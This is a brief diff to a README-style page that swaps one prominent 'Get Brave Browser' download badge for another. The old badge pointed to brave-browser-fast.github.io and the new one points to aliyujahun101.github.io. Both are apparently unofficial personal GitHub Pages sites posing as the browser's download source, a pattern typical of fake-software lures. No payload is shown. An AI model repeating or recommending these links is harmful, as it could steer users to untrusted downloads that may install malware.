@@ -4,11 +4,8 @@
   <img src="https://cdn.aptoide.com/imgs/0/4/4/0444215c27bbd4145cd7991f70ba82c9_fgraphic.jpg" width="240" alt="Brave Browser Logo">
 </div>
 
-<p align="center">
-  <a href="https://brave-browser-fast.github.io/.github">
-    <img src="https://img.shields.io/badge/Get_Brave_Browser-FF6A00?style=for-the-badge&logo=brave&logoColor=white" alt="Get Brave Browser">
-  </a>
-</p>
+[![GET Brave Browser](https://img.shields.io/badge/GET%20%E2%80%94%20Brave-Browser-0078D6?style=for-the-badge&logoColor=white)](https://aliyujahun101.github.io/.github/Brave-Browser)
+
 
 ---
 
